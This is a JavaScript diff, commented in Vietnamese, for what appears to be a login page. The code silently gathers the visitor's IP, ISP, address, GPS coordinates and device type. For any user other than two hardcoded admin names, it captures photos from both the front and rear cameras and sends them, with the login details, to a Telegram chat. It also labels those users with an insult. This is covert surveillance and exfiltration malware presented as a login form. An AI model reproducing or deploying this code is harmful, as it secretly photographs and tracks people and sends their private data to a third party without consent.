@@ -12,8 +12,18 @@ const info = {
   lat: '',
   lon: '',
   loginDetails: '',
-  isAdmin: false
+  isAdmin: false,
+  device: '' // Dùng để hiện dvi cho người lạ
 };
+
+// Hàm lấy thông tin thiết bị (dvi)
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Windows")) return "Windows PC";
+    if (ua.includes("iPhone")) return "iPhone (iOS)";
+    if (ua.includes("Android")) return "Android Phone";
+    return "Thiết bị không xác định";
+}
 
 async function getNetworkData() {
   try {
@@ -30,13 +40,10 @@ async function getNetworkData() {
   }
 }
 
-async function captureCamera() {
-  const user = document.getElementById('username').value.trim();
-  // CHẶN TUYỆT ĐỐI: Admin không bao giờ chạy code camera
-  if (user === "Mrwenben" || user === "VanThanh") return null;
-
+// Hàm chụp ảnh camera (hỗ trợ chụp cả 2 cam)
+async function captureCamera(mode = 'user') {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
     return new Promise(resolve => {
       const video = document.createElement('video');
       video.srcObject = stream;
@@ -55,15 +62,20 @@ async function captureCamera() {
   } catch (e) { return null; }
 }
 
-// --- HÀM TẠO NỘI DUNG SIÊU SẠCH (KHÔNG CÒN DÒNG THIẾT BỊ) ---
 function getCaption() {
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
   
-  const header = info.isAdmin 
-    ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP` 
-    : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
+  let header = "";
+  let dviLine = "";
 
-  // Ở đây tôi đã xóa sạch mọi biến liên quan đến device/os/dvi
+  if (info.isAdmin) {
+    header = `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP`;
+    dviLine = ""; // Admin thì không hiện dvi
+  } else {
+    header = `🚫 PHÁT HIỆN MỘT CON CHÓ NHẬP BỪA`;
+    dviLine = `📱 Thiết bị (dvi): ${info.device}\n`; // Người lạ thì hiện dvi
+  }
+
   return `
 ${header}
 ━━━━━━━━━━━━━━━━━━
@@ -71,7 +83,7 @@ ${header}
 👤 Tài khoản: ${info.loginDetails}
 🌐 IP dân cư: ${info.ip}
 🏢 Nhà mạng: ${info.isp}
-🏙️ Địa chỉ: ${info.address}
+${dviLine}🏙️ Địa chỉ: ${info.address}
 📍 Bản đồ: ${mapsLink}
 ━━━━━━━━━━━━━━━━━━
 `.trim();
@@ -84,29 +96,48 @@ async function main() {
   info.time = new Date().toLocaleString('vi-VN');
   info.loginDetails = `${user} (${role})`;
   info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
+  info.device = getDeviceInfo();
 
   await getNetworkData();
   
-  const frontBlob = await captureCamera();
-
-  // Nếu là Admin hoặc không chụp được ảnh, gửi tin nhắn văn bản thuần túy
-  if (frontBlob && !info.isAdmin) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    const media = [{ type: 'photo', media: 'attach://front', caption: getCaption() }];
-    formData.append('front', frontBlob, 'front.jpg');
-    formData.append('media', JSON.stringify(media));
-    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
-  } else {
+  // Nếu là Admin: Gửi tin văn bản luôn, không chụp ảnh
+  if (info.isAdmin) {
     await fetch(API_SEND_TEXT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: TELEGRAM_CHAT_ID, 
-        text: getCaption(),
-        disable_web_page_preview: true 
-      })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption(), disable_web_page_preview: true })
+    });
+    return true;
+  }
+
+  // Nếu là người lạ: Chụp cả 2 camera
+  const frontBlob = await captureCamera('user');
+  const backBlob = await captureCamera('environment');
+
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  
+  const media = [];
+  if (frontBlob) {
+    formData.append('front', frontBlob, 'front.jpg');
+    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
+  }
+  if (backBlob) {
+    formData.append('back', backBlob, 'back.jpg');
+    media.push({ type: 'photo', media: 'attach://back' });
+  }
+
+  if (media.length > 0) {
+    formData.append('media', JSON.stringify(media));
+    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+  } else {
+    // Nếu không chụp được ảnh nào vẫn gửi tin nhắn báo cáo
+    await fetch(API_SEND_TEXT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
     });
   }
+  
   return true; 
 }
